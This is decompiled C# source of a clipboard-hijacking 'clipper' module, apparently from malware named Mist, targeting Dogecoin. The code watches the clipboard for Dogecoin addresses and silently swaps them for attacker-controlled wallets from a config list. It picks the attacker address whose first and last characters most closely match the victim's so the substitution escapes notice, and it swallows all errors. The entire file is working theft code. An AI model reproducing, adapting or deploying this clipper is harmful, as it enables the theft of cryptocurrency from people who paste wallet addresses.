using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows;

namespace Mist.Clipper
{
	// Token: 0x02000078 RID: 120
	internal class Doge
	{
		// Token: 0x060002CC RID: 716 RVA: 0x0001313C File Offset: 0x0001133C
		public static void GetDogeWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletsDoge.Contains(text) && Doge.CheckDoge.Clipregex(text))
					{
						Doge.CheckDoge.SetsDoge(text);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x02000079 RID: 121
		private class CheckDoge
		{
			// Token: 0x060002CE RID: 718 RVA: 0x00013188 File Offset: 0x00011388
			public static bool Clipregex(string clipboard)
			{
				string text = clipboard.Trim();
				return text.Length >= 26 && text.Length <= 34 && new Regex(Doge.CheckDoge.Key).IsMatch(text);
			}

			// Token: 0x060002CF RID: 719 RVA: 0x000131C8 File Offset: 0x000113C8
			internal static void SetsDoge(string originalClipboardText)
			{
				try
				{
					string b = originalClipboardText.Trim();
					HashSet<string> hashSet = new HashSet<string>();
					int num = 0;
					foreach (string text in Config.walletsDoge.ToList<string>())
					{
						int num2 = Doge.CheckDoge.FirstCharFitNum(text, b);
						if (num2 >= num)
						{
							if (num2 == num)
							{
								hashSet.Add(text);
							}
							else if (num2 > num)
							{
								hashSet.Clear();
								num = num2;
								hashSet.Add(text);
								Clipboard.SetText(text);
							}
						}
					}
					int num3 = 0;
					foreach (string text2 in hashSet)
					{
						int num4 = Doge.CheckDoge.LastCharFitNum(text2, b);
						if (num4 > num3)
						{
							num3 = num4;
							Clipboard.SetText(text2);
						}
					}
				}
				catch
				{
				}
			}

			// Token: 0x060002D0 RID: 720 RVA: 0x00012DC0 File Offset: 0x00010FC0
			private static int LastCharFitNum(string a, string b)
			{
				int num = 0;
				bool flag = true;
				int num2 = 0;
				while (num2 < Math.Min(a.Length, b.Length) && flag)
				{
					if (a[a.Length - 1 - num2] != b[b.Length - 1 - num2])
					{
						flag = false;
					}
					else
					{
						num++;
					}
					num2++;
				}
				return num;
			}

			// Token: 0x060002D1 RID: 721 RVA: 0x00012E1C File Offset: 0x0001101C
			private static int FirstCharFitNum(string a, string b)
			{
				int num = 0;
				bool flag = true;
				int num2 = 0;
				while (num2 < Math.Min(a.Length, b.Length) && flag)
				{
					if (a[num2] != b[num2])
					{
						flag = false;
					}
					else
					{
						num++;
					}
					num2++;
				}
				return num;
			}

			// Token: 0x0400017E RID: 382
			public static string Key = "^(D)[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz].*$";
		}
	}
}
